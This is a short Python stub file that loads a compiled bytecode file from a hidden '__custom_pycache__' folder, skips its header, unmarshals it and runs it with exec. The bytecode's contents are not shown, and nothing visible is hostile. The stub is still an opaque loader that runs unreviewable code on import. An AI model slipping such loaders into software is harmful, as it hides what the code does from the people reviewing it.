
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'CustomTeleResponse_3ff25feb14554af68d65fd008d9ff2d8.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
